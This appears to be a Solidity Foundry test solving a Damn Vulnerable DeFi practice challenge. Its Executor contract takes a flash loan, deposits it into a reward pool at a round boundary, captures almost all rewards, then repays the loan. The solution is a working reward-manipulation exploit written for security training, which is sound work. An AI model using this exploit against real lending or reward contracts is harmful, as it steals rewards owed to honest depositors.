// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {Test} from "forge-std/Test.sol";
import {Utilities} from "../Utilities.sol";
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FlashLoanerPool}   from "../../src/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool}   from "../../src/the-rewarder/TheRewarderPool.sol";
import {RewardToken}       from "../../src/the-rewarder/RewardToken.sol";
import {AccountingToken}   from "../../src/the-rewarder/AccountingToken.sol";

contract Executor {
    DamnValuableToken internal liquidityToken;
    FlashLoanerPool   internal flashLoanPool;
    TheRewarderPool   internal rewarderPool;
    RewardToken       internal rewardToken;
    AccountingToken   internal accountingToken;
    address internal owner;

    constructor(
        DamnValuableToken _liquidityToken, 
        FlashLoanerPool   _flashLoanPool, 
        TheRewarderPool   _rewarderPool, 
        RewardToken       _rewardToken
    ) {
        owner = msg.sender;
        liquidityToken  = _liquidityToken;
        flashLoanPool   = _flashLoanPool;
        rewarderPool    = _rewarderPool;
        rewardToken     = _rewardToken;
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        require(msg.sender == address(flashLoanPool), "only pool");

        console.log('1 - receiveFlashLoan');
        
        liquidityToken.approve(address(rewarderPool), borrowAmount);
        console.log('2 - approve');

        // theorically depositing DVT call already distribute reward if the next round has already started
        rewarderPool.deposit(borrowAmount);
        console.log('3 - rewarderPool.deposit');

        // we can now withdraw everything
        rewarderPool.withdraw(borrowAmount);
        console.log('4 - rewarderPool.withdraw');

        // we send back the borrowed tocken
        bool payedBorrow = liquidityToken.transfer(address(flashLoanPool), borrowAmount);
        console.log('5 - payedBorrow');

        require(payedBorrow, "Borrow not payed back");

        // we transfer the rewarded RewardToken to the contract's owner
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        bool rewardSent = rewardToken.transfer(owner, rewardBalance);

        require(rewardSent, "Reward not sent back to the contract's owner");
    }

    function attack() external {
        require(msg.sender == owner, "only owner");
        console.log('0 - executeFlashLoan');

        uint256 dvtPoolBalance = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(dvtPoolBalance);
    }
}

contract TheRewarderTest is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    DamnValuableToken internal liquidityToken;
    FlashLoanerPool   internal flashLoanPool;
    TheRewarderPool   internal rewarderPool;
    RewardToken       internal rewardToken;
    AccountingToken   internal accountingToken;

    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {

        console.log('0 - setUp');

        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        // setup contracts
        liquidityToken = new DamnValuableToken();
        vm.label(address(liquidityToken), "DamnValuableToken");

        flashLoanPool = new FlashLoanerPool(address(liquidityToken));
        vm.label(address(liquidityToken), "FlashLoanerPool");

        // Set initial token balance of the pool offering flash loans
        liquidityToken.transfer(address(flashLoanPool), TOKENS_IN_LENDER_POOL);

        rewarderPool = new TheRewarderPool(address(liquidityToken));
        rewardToken = rewarderPool.rewardToken();
        accountingToken = rewarderPool.accToken();


        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (uint8 i; i < 4; i++) {

            console.log('0 - deposit 100 tokens');
            console.log(users[i]);

            uint256 amount = USER_DEPOSIT;
            liquidityToken.transfer(users[i], amount);

            vm.startPrank(users[i]);
            liquidityToken.approve(address(rewarderPool), amount);
            rewarderPool.deposit(amount);
            vm.stopPrank();

            assertEq(accountingToken.balanceOf(users[i]), amount);
        }

        assertEq(accountingToken.totalSupply(),  USER_DEPOSIT * 4);
        assertEq(rewardToken.totalSupply(), 0 ether);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        // Each depositor gets 25 reward tokens
        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            rewarderPool.distributeRewards();
            assertEq(
                rewarderPool.rewardToken().balanceOf(users[i]),
                25e18
            );
        }

        assertEq(rewardToken.totalSupply(), 100e18);

        // Attacker starts with zero DVT tokens in balance
        assertEq(liquidityToken.balanceOf(attacker), 0);

        assertEq(rewarderPool.roundNumber(), 2);
    }

    function test_Exploit() public {
        _exploit();
    }

    function _exploit() internal {
        /** CODE YOUR EXPLOIT HERE */

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        // deploy the exploit contract
        vm.startPrank(attacker);
        Executor executor = new Executor(liquidityToken, flashLoanPool, rewarderPool, rewardToken);
        executor.attack();
        vm.stopPrank();
    }

    function success() internal {
        /** SUCCESS CONDITIONS */

        // Only one round should have taken place
        assertEq(rewarderPool.roundNumber(), 3);

        // Users should get neglegible rewards this round
        for (uint8 i; i < 4; i++) {
            // Users should get negligible rewards this round
            vm.prank(users[i]);
            rewarderPool.distributeRewards();

            uint256 rewards = rewardToken.balanceOf(users[i]);
            console.log(users[i]);
            console.log(rewards);

            // The difference between current and previous rewards balance should be lower than 0.01 tokens [ethers.utils.parseUnits('1', 16)]
            uint256 delta = rewards - 25 ether;
            assertLt(delta, 0.01 ether);
        }
        
        // Rewards must have been issued to the attacker account
        assertGt(rewardToken.totalSupply(), 100 ether);
        uint256 rewardsAttacker = rewardToken.balanceOf(attacker);

        // The amount of rewards earned should be really close to 100 tokens [ethers.utils.parseUnits('1', 17)]
        uint256 deltaAttacker = 100 ether - rewardsAttacker;
        assertLt(deltaAttacker, 0.1 ether);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(liquidityToken.balanceOf(attacker), 0);
    }
}